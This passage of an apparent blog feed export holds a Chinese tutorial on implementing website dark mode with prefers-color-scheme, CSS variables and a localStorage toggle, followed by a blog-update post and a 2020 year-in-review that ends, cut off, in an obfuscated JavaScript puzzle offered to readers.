的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 18:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ 